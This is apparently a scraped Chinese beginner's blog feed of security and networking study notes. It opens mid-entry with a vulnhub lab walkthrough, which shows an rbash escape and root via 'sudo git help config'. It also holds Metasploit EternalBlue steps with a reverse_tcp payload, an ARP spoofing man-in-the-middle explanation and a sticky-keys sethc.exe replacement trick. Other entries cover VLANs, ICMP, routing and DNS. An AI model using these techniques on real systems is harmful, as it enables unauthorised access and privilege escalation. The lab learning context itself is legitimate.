alt></a></p><h1 id="3-后台登入"><a href="#3-后台登入" class="headerlink" title="3.后台登入"></a>3.后台登入</h1><p>然后我们使用jerry的账号进行登入wordpress得到后台，这里提示一下一般wordpress的默认登录页面为wp-login.php我们在登录jerry的账号之后发现了flag2提示我们换一种方法进行渗透。</p><p><a href="https://imgchr.com/i/BfRKGq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/06/BfRKGq.png" alt></a></p><h1 id="4-ssh连接和提权"><a href="#4-ssh连接和提权" class="headerlink" title="4.ssh连接和提权"></a>4.ssh连接和提权</h1><p>然后，我们这时候肯定会感觉抓瞎，而我们在信息收集的时候是不是发现了一个ssh端口，这时候我们通过kali利用tom的账号连接靶机发现连接成功，命令如下：</p><pre class=" language-shell"><code class="language-shell">ssh tom@192.168.146.140 -p 7744</code></pre><p><a href="https://imgchr.com/i/BfWESx" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/06/BfWESx.png" alt></a></p><p>在连接成功之后，ls一下发现了flag3.txt文件，cat一下，发现没有权限，根据提示我们发现tom用户呗rbash了，所谓的rbash就是受限制的shell，瞬间感觉tom用户是真的卑微，不过我们可以直接vi flag3.txt这样我们就可以看到其中的内容。</p><p><a href="https://imgchr.com/i/BfWu0e" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/06/BfWu0e.png" alt></a></p><p>打开之后发现解释是tom很老了，也许他需要用其他的方式来抓老鼠，实际上就是提示我们提升tom用户的权限，我在看了很多的提权方法之后，觉得是tom用户权限受限制的原因是环境变量的原因，那么我们下一步就是改变tom的环境变量，命令如下</p><pre class=" language-shell"><code class="language-shell">BASH_CMDS[a]=/bin/sh   ;   a        #调用bin文件下的sh命令解释器/bin/bash   #使用bash命令解释器export PATH=PATH:/bin:/sbin:/usr/bin:/usr/sbin  #设置环境变量</code></pre><p><a href="https://imgchr.com/i/BfW8pt" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/06/BfW8pt.png" alt></a></p><p>在设置好环境变量之后我们就可以用cd命令，也就是说我们的权限成功提升了，cd到/home下我们看到jerry用户进入jerry用户的文件，看到了flag4.txt文件，我们cat一下发现文件提示我们利用git，所以我们su一下到jerry用户，发现jerry用户可以以root的权限来运行git，这就是一个可以提权的点.</p><p><a href="https://imgchr.com/i/BfWU0g" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/06/BfWU0g.png" alt></a></p><p>然后利用命令</p><pre class=" language-shell"><code class="language-shell">sudo git help config  #进入文件!/bin/bash           #成功提权</code></pre><p><a href="https://imgchr.com/i/BfWhN9" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/06/BfWhN9.png" alt></a></p><p><a href="https://imgchr.com/i/BfWI91" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/06/BfWI91.png" alt></a></p><p>我们在成功提权之后直接进入到root目录下就可以看到最终的flag.</p>]]></content>
      
      
      <categories>
          
          <category> web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub中的wordpress靶场</title>
      <link href="/2020/10/27/vulnhub%E4%B8%AD%E7%9A%84wordpress%E9%9D%B6%E5%9C%BA/"/>
      <url>/2020/10/27/vulnhub%E4%B8%AD%E7%9A%84wordpress%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="vulnhub的介绍"><a href="#vulnhub的介绍" class="headerlink" title="vulnhub的介绍"></a>vulnhub的介绍</h1><p>最近刚开始学习web渗透，也搭建了一个vulnhub的靶场，在这里我介绍一下vulnhub靶场，这是一个公开的免费的web渗透靶场，我们在选好相关目标靶场之后下载靶场的相关压缩文件，解压后直接在虚拟机中打开就可以了（你所下载的压缩包其实就是一个虚拟机文件的压缩版），然后在开机之后就可以开始你的渗透之旅了。</p><h1 id="web渗透的简单了解（本人的见解欢迎指正）"><a href="#web渗透的简单了解（本人的见解欢迎指正）" class="headerlink" title="web渗透的简单了解（本人的见解欢迎指正）"></a>web渗透的简单了解（本人的见解欢迎指正）</h1><p>以我现在了解的了解web渗透分大体分为：信息收集，漏洞发现，漏洞利用拿到shell（在我看来到此为前渗透阶段），拿到shell之后利用漏洞进行提权，执行自己的目的操作（比如打爆服务器的数据），留下后门，删库跑路（至此为后渗透阶段）。</p><p>反弹shell：就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端，而我们常见的web中利用反弹shell拿到shell的原理就是利用各种软件的漏洞执行相关命令让目标PC主动连接我们的攻击机，从而完成前渗透阶段的最后一步。</p><h1 id="vulnhub中的woerdpress靶场（DC6）"><a href="#vulnhub中的woerdpress靶场（DC6）" class="headerlink" title="vulnhub中的woerdpress靶场（DC6）"></a>vulnhub中的woerdpress靶场（DC6）</h1><p>此靶场主要利用wordpress的Plainview Activity Monitor插件的漏洞来拿到shell，原理是可以从这个插件中传输数据中做手脚从而能够远程执行恶意代码，wordpress官方的公告为：<a href="http://blog.nsfocus.net/cve-2018-15877/" target="_blank" rel="noopener">http://blog.nsfocus.net/cve-2018-15877/</a> ，而我们的攻击机kali中的msf就具有对此插件的相关攻击模块。</p><p>我们进行渗透过程中会用到WPScan这个工具，此工具为Kali自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能。</p><p>靶场渗透提示：wordpress的默认后台登录页面为wp-login.php。</p><p>具体渗透操作请参考大佬博客：<a href="https://www.cnblogs.com/-chenxs/p/12060347.html" target="_blank" rel="noopener">https://www.cnblogs.com/-chenxs/p/12060347.html</a> 或者 <a href="https://www.jianshu.com/p/fbb357ebf1cf" target="_blank" rel="noopener">https://www.jianshu.com/p/fbb357ebf1cf</a></p>]]></content>
      
      
      <categories>
          
          <category> web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>单臂路由和ICMP协议</title>
      <link href="/2020/09/18/%E5%8D%95%E8%87%82%E8%B7%AF%E7%94%B1%E5%92%8CICMP%E5%8D%8F%E8%AE%AE/"/>
      <url>/2020/09/18/%E5%8D%95%E8%87%82%E8%B7%AF%E7%94%B1%E5%92%8CICMP%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="单臂路由"><a href="#单臂路由" class="headerlink" title="单臂路由"></a>单臂路由</h1><p>我们在设置好vlan之后如果连接同一台交换机的PC在不同的vlan之中是没有办法进行通信的（相当于处于不同的vlan的PC是处于不同的局域网），这样一来我就需要用到单臂路由（虽然现在被淘汰了），单臂路由的具体实现是在原本的路由器的接口处分生出子接口而不同的vlan则连接不同的子接口，而实现不同vlan之间的通信就需要用到这些子接口，具体过程为：在vlan2中的一台PC想要同vlan3中的一台PC进行通信的话在数据帧经过交换机之后会传到路由器，再从路由器的借口接收到数据帧之后会对所收数据帧在判断所属是哪一个vlan之后会将数据帧传输到该vlan的子接口，然后子接口在对所收数据帧进行解封装之后在根据路由表进行路由转发，也就是说每一个子接口就相当于一台路由器，而我们原本的物理路由器就是这些“路由器”的集合，由于将整体的抽象图画出之后根据图像从而称之为单臂路由（本人自己猜测）。</p><p>具体的单臂路由配置过程我就不在这里说了，每一个牌子的路由器的命令有所不同，需要自己去把路由器的命令手册dang下来自己研究。</p><h1 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h1><p>我们通常ping其他PC时所用的协议你可能会认为是强大的TCP协议，但实际上真正实现这个功能的是ICMP协议，ICMP协议属于是TCP/IP五层协议的第三层，且ICMP协议没有具体的端口号，ICMP协议具体用处为：1.网络探测 2.路由跟踪 3.错误反馈。ICMP协议数据的封装格式为：ICMP头+数据，而ICMP头中的则为ICMP类型+代码。其中，数据这一板块芝士味确认你收到了这个包，其中的内容都是些无意义的数据。而ICMP类型则是为了表现出你返回的ICMP包是什么类型，例如：是正常回包还是错误回包。而之后的类型则是为了表现出错误回包是什么类型。如果你的返回包不是错误的ICMP类型的值会与代码的值相同。</p><h2 id="几种ICMP类型的说明"><a href="#几种ICMP类型的说明" class="headerlink" title="几种ICMP类型的说明"></a>几种ICMP类型的说明</h2><p>ICMP的类型值有很多我接下来只说明几种：</p><p>1.若类型值为8则是ping请求包。</p><p>2.若类型值为0则为ping应答包。</p><p>3.若类型值为3则为目标主机不可达的错误回包，也就是这种类型的ICMP包之后的代码值会与类型值不同，而不同的代码值对应不同的回包。</p><p>4.若类型值为11则为TTL超时的数据包，这种回包可用于路由追踪（可以返回ping的过程中所经历的路由器IP地址）。而实现路由追踪的命令Windows为: tracert+IP地址       Linux为：traceroute+IP地址</p>]]></content>
      
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vlan的了解</title>
      <link href="/2020/09/16/vlan%E7%9A%84%E4%BA%86%E8%A7%A3/"/>
      <url>/2020/09/16/vlan%E7%9A%84%E4%BA%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="vlan产生的原因"><a href="#vlan产生的原因" class="headerlink" title="vlan产生的原因"></a>vlan产生的原因</h1><p>在局域网中，由于我们的PC会经常性的发送广播，例如ARP广播，交换机的广播等等，我们的PC对于广播会直接接收，如果广播的内容对于我们自身的PC无用则会被丢弃，而如果一个局域网中连接的PC数量较多的话我们的PC则会运行直接“爆炸“，同时也是为了防止局域网中的广播攻击，于是就有了vlan这一技术。</p><h1 id="vlan的介绍"><a href="#vlan的介绍" class="headerlink" title="vlan的介绍"></a>vlan的介绍</h1><p>vlan主要是部署在交换机上的一种技术，我们日常生活中所用的路由器则没有这种技术，一般管理型的交换机会具有这种技术，vlan的具体实现原理为将同一局域网分为不同的虚拟局域网，简单来说就是让同一局域网中的PC相当于位于不同局域网，这样一来就会缩减广播域，减少每一台PC的接收广播的负担，而vlan实现这样工作的原理就是在交换机接收你的数据包之后跟据数据包中的MAC地址进行转发，但是在转发到目标PC连接的端口时目标端口会检查数据包来源是不是和自己在同一vlan如果不是数据包则会被丢弃，如果是则会让其通过。</p><h1 id="vlan的部署"><a href="#vlan的部署" class="headerlink" title="vlan的部署"></a>vlan的部署</h1><p>vlan的部署我了解的有三种，第一种vlan的部署是基于交换机连接端口的部署，举个例子，一台交换机上部署有两个vlan，分别为vlan1和vlan2，分别连接有两台PC如果这两台PC交换连接的福安口，那么这两台PC就会转换所处的vlan。第二种则是基于MAC地址的vlan，它和第一种相似之处都是需要手工配置，但是他会根据所连接的PC的MAC地址来进行vlan的转换。第三种则需要账号密码验证机制，其中原理我了解不多所以就不说了，但这种机制只需要你输入账号密码在验证通过之后就会为你的PC动态设置所属vlan，这种机制也是则方便的机制。</p><h1 id="vlan中的trunk"><a href="#vlan中的trunk" class="headerlink" title="vlan中的trunk"></a>vlan中的trunk</h1><p>我们在设置好同一台交换机上的vlan之后，在连接其他配置好vlan的交换机后我们会发现在同一个vlan上但连接不同的交换机的PC之间不能够通信，所以vlan中的trunk技术就有用了，由于交换机之间互相连接的端口一般是属于vlan1的而我们自己如果配置好vlan的话一般就造成了这个连接端口与其他vlan分开，而不同vlan之间又不能通信，而trunk技术的作用就是让这个交换机之间互相连接的端口不属于任何一个vlan，这样所有的vlan数据就都能够通过这个公共链路进行传输。</p><h1 id="trunk的注意事项"><a href="#trunk的注意事项" class="headerlink" title="trunk的注意事项"></a>trunk的注意事项</h1><p>trunk帮助我们解决了不同交换机之间相同vlan的通信，但是数据在传输到另一台交换机之后是怎么识别数据来自哪一个vlan的又是一个问题，这里trunk中配备的有一个协议具体如下：在交换机收到来自不同vlan的数据之后会将这个数据打上一个标签，在另一台交换机收到数据上之后会将解除这个标签并且确认数据的来源是哪一个vlan，之后再进行传输。而这个打标签的方法目前有两种分别为：lsl标签这个为Cisco公司私有的打上标签的方法，具体为将你的数据帧前加上一个26字节的数据同时也会在你的数据帧后加上一个4个字节的数据，另一种则为802.1q，这个是国际公共的加标签的协议，具体为在你的数据帧中间加上4个字节的数据。</p><p>vlan中连接PC的端口我们一般称之为接入端口，只能属于一个vlan也只能传输一个vlan的数据，而像那种连接不同交换机的端口则为中继端口，也称之为公共端口，能够允许所有vlan的数据通过。</p><p>注意：交换机在接收到带有标签的数据震后是会吧数据标签拿下来鉴定数据传输的具体端口之后再进行转发，而标签呗拿下来之后就会被丢弃不会再被加上，我们的PC不能识别带有标签的数据帧！</p>]]></content>
      
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSF中的永恒之蓝</title>
      <link href="/2020/08/18/MSF%E4%B8%AD%E7%9A%84%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/"/>
      <url>/2020/08/18/MSF%E4%B8%AD%E7%9A%84%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="永恒之蓝漏洞"><a href="#永恒之蓝漏洞" class="headerlink" title="永恒之蓝漏洞"></a>永恒之蓝漏洞</h1><p>永恒之蓝漏洞是于2017年发布的漏洞，可以说是一个危害性很大的漏洞，不过在此漏洞发布后不久各大厂商都做出了相关的补丁，有兴趣的可以去360上查看补丁。而永恒之蓝漏洞利用的主要是SVB这个协议，而所利用的我们PC上的445端口（所以平常别乱开445有点危险-.-），这里由于我自己也不太明白漏洞原理，所以就只介绍漏洞的使用方法了。</p><p>首先，准备kali和Windows7的虚拟机（Windows2003，2008，xp都可以，但不要尽量装最新的杀毒软件），在kali’的终端输入msfconsole进入msf然后输入use exploit/windows/smb/ms17_010_eternalblue(不确定命令的正确性的话可以同tab补全)，进入永恒之蓝的攻击页面，在进行攻击之前需要我们进行一些目标主机的设置和攻击者的设置，输入命令set RHOST 192.168.1.112（攻击目标IP），然后设置payload（攻击载荷，连接目标主机与本机的通道）命令如下：set payload windows/x64/meterpreter/reverse_tcp 调用攻击载荷，后设置攻击主机set lhost 192.168.1.113，后在命令行exploit发起攻击，攻击成功之后我们一般拿到的时system的权限，也就是最高权限，也就是说我们拿到了webshell。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web中的渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础知识补充</title>
      <link href="/2020/07/24/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/"/>
      <url>/2020/07/24/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h1><p>在我们日常生活中总能听到路由器这个名讽刺，我们日常所用家用路由器实际上可以说是一个三层交换机（交换机和路由器的集合体）,用企业的网络来说，最基本的网络由交换机和PC构成内网，再由路由器构成网关，而路由器则和外网连接，也就是说我们的PC和互联网的连接点为路由器，而路由器转发数据的过程就称为路由，那么，路由器是如何转发数据的，这里我们利用下方的简单图形进行说明，IP为10.1.1.1的PC想要利用ping来ping其他网段的PC，首先，PC会检查对方是否与自己在同一网段，如果不是则会发送ARP广播向本网段的路由器请求路由器的MAC地址，然后封装包头，将数据帧送往路由器，路由器的入接口在收到数据帧后会先将数据帧的包头解封装。这时候路由器自身内部会有一个表，我们称之为路由表，而路由表中记录的是IP地址，凡是路由器收到数据帧解封装后，会将数据帧中的目标IP与自己的路由表进行比对，如果比对相同则会将数据帧转至路由器的出接口准备进行转发，如果不同则会将数据帧丢弃，然后我们接着上边继续，路由器在与自己的路由表进行比对之后发现目标IP与自己的路由表相匹配，将原本数据转至路由器的出接口，在这时路由器的出接口想要进行对数据的封装，但没有目标的MAC地址，所以会暂时停止对数据的封装，利用ARP协议向20.1.1.0网段的网关发送ARP广播来获取对方的MAC地址然后再进行包头的封装，发送数据帧，而20.1.1.0网段的路由器也就是网关在收到数据帧后会对数据解封装然后再进行路由表的比对，然后再利用ARP广播20.1.1.1的MAC地址，将数据封装之后送至IP地址为20.1.1.1的PC。</p><p><img src="https://s1.ax1x.com/2020/07/25/Uz66tx.png" alt="实例"></p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>以上所讲的是路由的基本过程，如果想要是路由器的功能更齐全的话，只会向这其中进行插入，例如VPN的功能，NAT，PAT等路由器的功能均是向以上所讲的过程之中进行插入。</p>]]></content>
      
      
      <categories>
          
          <category> web基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ARP协议/中间人攻击</title>
      <link href="/2020/07/13/ARP%E5%8D%8F%E8%AE%AE-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
      <url>/2020/07/13/ARP%E5%8D%8F%E8%AE%AE-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="ARP协议的叙述（需要了解一些基本知识）"><a href="#ARP协议的叙述（需要了解一些基本知识）" class="headerlink" title="ARP协议的叙述（需要了解一些基本知识）"></a>ARP协议的叙述（需要了解一些基本知识）</h1><p>ARP协议是我们得PC用来获取目标MAC地址所需要的一种协议，举个例子，如果我们在ping同一局域网某一台PC时，我们所发的ping的请求是以帧的形式通过交换机，然后再由交换机发往所ping的PC。我们如果想要实现ping通一台PC就需要目标PC的MAC地址和IP地址，通常我们在ping的时候就已经知道目标IP地址，但不知道MAC地址，所以在我们的ping的帧从我们的PC发出之前，我们必须得要知道目标PC得IP地址，所以这时候据需要发送APR请求用来获取目标的MAC地址而过程大致为：（以源IP10.1.1.1，目标IP10.1.1.2）</p><p>我们先发送一个广播，广播中的目标MAC地址为广播地址也就是12个F，广播内容大致为：我是10.1.1.1，我的MAC地址为AA，谁是10.1.1.2，请把你的MAC地址给我，然后在这个局域网中的所有PC都会收到这个广播，然后将这个广播报文进行帧头和帧尾的去除，然后每一个PC利用ARP协议将目标IP与自己的IP进行比对，如果正确，则会通过单播应答的方式，对回发自己的MAC地址，10.1.1.1在收到这个回包之后就会将10.1.1.2的MAC地址放到目标MAC地址处，发到交换机处，在由交换机转发到目标PC</p><h1 id="ARP的相关注意事项"><a href="#ARP的相关注意事项" class="headerlink" title="ARP的相关注意事项"></a>ARP的相关注意事项</h1><p>ARP的报文只能在局域网之间转发，不同的局域网不能转发。<br>在我们接收ARP报文的时候我们的PC会在自己本机形成一个ARP缓存，这个ARP缓存可以通过cmd或者powershell来查看，命令为</p><blockquote><p>arp -a</p></blockquote><p>我们的ARP缓存会在我们的PC上存在一段时间（毕竟是缓存），当然我们PC上的静态ARP缓存不会消失。ARP协议有一个弊端就是如果收到两份相同的ARP回包它只会学习最新收到的回包，将原有的相同的MAC地址缓存进行更新。（这就是中间攻击原理）</p><h1 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h1><p>在上边我已经说了ARP的弊端，接下来就要说怎么利用了，在同一局域网中，有三台机器地址分别为10.1.1.1，10.1.1.2，10.1.1.3，我以10.1.1.2为攻击者，其他两个为被攻击者，10.1.1.2向10.1.1.1发送ARP报文内容大致为：我是10.1.1.3，我的MAC地址为AA，同时也向10.1.1.3发送ARP报文内容大致为：我是10.1.1.1，我的MAC地址为AA，此时10.1.1.1和10.1.1.3两台PC上的ARP缓存都接受ARP报文并进行了更新，此时如果10.1.1.1向10.1.1.3发送信息就会先流经10.1.1.2然后转往10.1.1.3，同样10.1.1.3发往10.1.1.1的信息也是如此，然后我们就可以利用相关软件来进行信息的窃取或者修改，具体软件我就不多说了<del>（kali的ettrecap）</del></p>]]></content>
      
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>知识补充1</title>
      <link href="/2020/05/11/%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%851/"/>
      <url>/2020/05/11/%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%851/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="组与管理（本人目前就学了这么多如果有不对的地方欢迎指正）"><a href="#组与管理（本人目前就学了这么多如果有不对的地方欢迎指正）" class="headerlink" title="组与管理（本人目前就学了这么多如果有不对的地方欢迎指正）"></a>组与管理（本人目前就学了这么多如果有不对的地方欢迎指正）</h1><p>我们每一个人的电脑上都会有用户，而每一个用户的权限不一样，将相同权限的用户归于同一个族中就会形成不同的组，例如在win10系统中我们一般登录的话都是用自己的用户名和密码登录，win7中会发现我们登陆时用户名为Administrator，在这里win10与win7不同的是win10将Administrator同用户分离出来相当于是一样的“分身”，而我们所用的是分离出来的这一个。说了这么多，那么我们的电脑上到底有多少用户，<del>在这里我先对组进行解释再对用户进行解释</del>，我们电脑上的组大致分为（win10）：</p><p><strong>vmware</strong><br>Administrators<br>Device Owners<br>Distributed COM Users<br>Event Log Readers<br>Guests<br>Hyper-V Administrators<br>IIS_IUSRS<br>Performance Log Users<br>Performance Monitor Users<br>Remote Management Users<br>System Managed Accounts Group<br>Users</p><p>我的组可能和一般的不一样（<del>我装了某些软件的原因</del>），这其中权限最高的是Administrators（管理员组）这个组，而我们平常登录电脑时所用的用户名就在这个组中，但是这并不代表我们就有最高权限，在这个组中administrator有着最高权限，相当于可以对电脑上的设置进行修改，这里的Guests组是一个来访外宾组，这个组中的成员可以对你电脑上的文件进行访问，但无法进行修改，上传等功能，也就说这个组里的用户权限很小。接着我们来说一下Users这个组，这个组的成员的权限比Guests大，但比Administrators小，如果我们新建一个用户的话默认实在这个组里，如果想要对新建的用户进行权限的升级请往下看。</p><h2 id="用户标识符（SID）"><a href="#用户标识符（SID）" class="headerlink" title="用户标识符（SID）"></a>用户标识符（SID）</h2><p>我们每个用户在电脑上都会自己的SID，而SID相当于我们的身份证，一般来说，Windows普通用户的SID从1000开始（包括我们自己登陆时用的用户），而管理员也就是Administrator这个用户的SID是从500开始的。</p><h2 id="用户整体知识的补充"><a href="#用户整体知识的补充" class="headerlink" title="用户整体知识的补充"></a>用户整体知识的补充</h2><p>一个电脑的用户总体上分为三类（这里所说的是整体同上边的不一样）：system 系统账户（权限至高无上），localservices本地服务账户（普通权限），networkservices网络服务账户（普通权限），而我们上边所说的Administrators组隶属于localservices这里，而我们如果有些系统设置需要对注册表的值进行修改有时候就需要用到system这个账户（有些注册表Administrator用户权限不够），同时我们如果将win10系统默认的文件共享关闭的话也需要用到这个账户。在这里我进行一个知识补充，我们一般的用户开机密码，一些软件的登录密码等都存储在C:\windows\system32\config\SAM这个文件里（别想着去打开这个文件，凭你的权限还打不开），如果我们想要打开这个文件，就需要用到这个账户。在windows系统上，默认密码最长有效期42天（尤其是服务器系统）。</p><h2 id="介绍个部分win7和win10的漏洞"><a href="#介绍个部分win7和win10的漏洞" class="headerlink" title="介绍个部分win7和win10的漏洞"></a>介绍个部分win7和win10的漏洞</h2><p>我们在开机时输入登陆密码的界面按五次shift键，会弹出c:\windows\system32\sethc.exe程序，这时候直接重启，在重启到正在载入Windows界面是直接关机再重启，这时候会出现多个选择，选择启动启动修复选项，这之后会出现系统还原的提示，点击取消，在等待几分钟之后会出现问题原因框，点击查看详细信息，下拉点击扩展名为.txt的链接会出现一个记事本，这时候点击文件，点击打开，然后找到C:\windows\system32这个文件，然后找到cmd.exe这个程序，复制一份，将文件名改为sethc，再将原来sethc.exe这个程序的名称改为其他的，之后再次重启，再按五次shift键出来的就是cmd命令行了，之后的操作就不多说了-.-。</p><h2 id="简单的命令行命令"><a href="#简单的命令行命令" class="headerlink" title="简单的命令行命令"></a>简单的命令行命令</h2><blockquote><p>netstat -an<br>查看本机所有开放端口<br>telnet：23<br>远程桌面协议RDP：3389<br>文件共享服务：445<br>HTTP协议端口号：TCP：80<br>HTTPS协议端口号：TCP：443<br>FTP端口号： TCP： 20/21  </p><p>whoami    查看当前用户名<br>whoami  /user 查看当前用户名以及SID<br>net share   查看共享文件夹的目录<br>net share  共享文件夹名 /del   删除共享</p><p>ipconfig    查看自己本机的IP<br>ipconfig /all   查看自己本机的所有IP<br>ipconfig /release  释放IP<br>ipconfig /flushdns  删除本地dns缓存</p><p>net user laji 显示用户laji的信息<br>net user laji /add 增加用户laji<br>net user laji /del 删除用户laji<br>net user laji /active:yes 激活用户laji<br>net user laji /active:no 禁用用户laji</p><p>net localgroup 显示全部本地组<br>net localgroup administrators 显示组administrators的成员<br>net localgroup ceo /add 增加组ceo<br>net localgroup ceo laji /add 向组ceo中加入成员laji<br>net localgroup ceo laji /del 向组ceo中删除成员laji</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IP和DNS的简单叙述</title>
      <link href="/2020/04/20/IP%E5%92%8CDNS%E7%9A%84%E7%AE%80%E5%8D%95%E5%8F%99%E8%BF%B0/"/>
      <url>/2020/04/20/IP%E5%92%8CDNS%E7%9A%84%E7%AE%80%E5%8D%95%E5%8F%99%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="IP的简单叙述前的部分知识补充"><a href="#IP的简单叙述前的部分知识补充" class="headerlink" title="IP的简单叙述前的部分知识补充"></a>IP的简单叙述前的部分知识补充</h1><p>众所周知，我们每一个普通的个人电脑都会有一个IP，那么IP是什么呢？</p><p>本人认为IP是一种标识性的编码，其实现在通用的普通IP是32二进制编码，但为了方便记忆一般都是将IP进行了十进制的翻译，且在翻译为十进制时，每个字节最多为3位，（有一些基本常识都知道在电脑中二进制是8位为一个字节，所以翻译为十进制最大为三位数），所以十进制下的IP地址每个字节最多为3位。</p><p>这里作为对IP地址的进一步的补充，我首先说一下网段这个概念，比如说：一个不懂中文的外国人和一个不懂英文的中国人在口语方面不能进行交流，同样的来自不同网段的的PC由于规则限制也不能够交流（这里可以将语言的不同比作为规则的限制，不同的人比作为不同网段的PC），说这麽多我们可以通过举例来说明一个网段的具体实现。</p><p>例如：10.1.1.1-10.1.1.255这一段IP可以说是一个网段，就好比在同一国家的人能够实现互相的语言交流（不同PC的交流），当然发现这个网段的IP数目有点少，我们也可以将10.1.1.1-10.1.255.255当作一个网段，这样一来IP数目就多了，能够交流的人也就多了，同样的我们可以将10.1.1.1-10.255.255.255当作一个网段，而通常我们会用10.1.1.0来表示10.1.1.1-10.1.1.255这个网段。</p><p>说这么多，那怎么在获取一个IP地址时知道它是哪个网段呢？这里我介绍一个概念：子网掩码，我们在命令行输入ipconfig可以看到我们自己PC端的IP地址，通常我们在IPv4下一行会看到子网掩码，那么子网掩码到底是干啥的？这里我举例说明一下：<br>例如我的IP为10.1.1.1，此时子网掩码为255。255.255.0，那么我的IP就属于10.1.1.0这个网段其中的一个IP，如果我的子网掩码为255.255.0.0，那么我的IP就属于10.1.0.0这个网段，其实子网掩码就是对网段位数的限制。</p><p>这里我在说明一点如果你的网段为10.1.1.0，但并不代表你属于10.1.0.0这个网段，每个网段都是相互独立的，就好比不同的人来自不用的国家（网段），虽然他们都是人（IP），有的人来自国土较小的国家，有的人来自国土较大的国家，但并不代表小国就属于大国。同样的如果我的IP为10.1.1.1，子网掩码为：255.255.255.0另一台PC的IP为：20.1.1.1，子网掩码为：255.255.255.0，我们这两台IP是不能通信的，因为我们来自不同的“国家”（网段）。</p><h1 id="DNS服务器"><a href="#DNS服务器" class="headerlink" title="DNS服务器"></a>DNS服务器</h1><p>所谓DNS也称域名解析服务器，这个服务器在我们的日常上网时起到了很重要的作用。</p><p>通常我们在访问一个网站时基本都是输入网站的域名，例如我访问百度时：<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 这就是百度的域名（确切来说是主机名加域名，这里不做过多解释），我访问百度时而不是用百度的IP地址直接访问，这个是由于记住网站的IP实在有点难度，所以，我们就设置了域名（这是我自己的想法，具体为啥不用网站IP还有其他的原因）。</p><h2 id="接下来步入主题"><a href="#接下来步入主题" class="headerlink" title="接下来步入主题"></a>接下来步入主题</h2><h3 id="1-访问一个网站的过程的简单解释（不专业也不完全版）"><a href="#1-访问一个网站的过程的简单解释（不专业也不完全版）" class="headerlink" title="1.访问一个网站的过程的简单解释（不专业也不完全版）"></a>1.访问一个网站的过程的简单解释（不专业也不完全版）</h3><p>首先，你输入网站的域名之后，你的PC会先从你的本地缓存中找是否有你这个域名的缓存，如果没有再从你本地的一个文件中找是否有缓存（一般这个文件都是空的，这里就不多说了），然后通过你的网关也就是你的路由器，发送相关请求到DNS服务器，然后服务器会根据你的请求来进行服务器上的缓存筛选，如果服务器的缓存中有你这个域名的缓存，它会将这个域名所代表服务器的IP地址再通过你的网关发送到你的PC端上，然后你的PC根据这个IP访问相对应的服务器，这是你的PC会有一段时间有对这个域名的缓存，当你在第二次访问这个域名时你的PC会直接根据缓存中的IP地址来访问相关的服务器。</p><h3 id="2-网关的相关解释（不专业也不完全版）"><a href="#2-网关的相关解释（不专业也不完全版）" class="headerlink" title="2.网关的相关解释（不专业也不完全版）"></a>2.网关的相关解释（不专业也不完全版）</h3><p>一般来说我们组建局域网（内网）需要同过交换机，而交换机的作用其实相当于一个中介，例如：有两台PC，原本不能相互通讯，当这两台PC连上同一个交换机时就能够相互通讯，如果电脑A想发送信息到电脑B，那么这其中的过程为A所发送的信息到交换机，再由交换机转到B。</p><p>上述的情况只能够在一个局域网内进行，如果想连到外网，这里就需要路由器，而路由器就相当于内网与外网相连接窗口，我们普通家用的路由器基本上可以说是是交换机和路由器的“合体”。</p>]]></content>
      
      
      <categories>
          
          <category> web基础 </category>
          
      </categories>
      
      
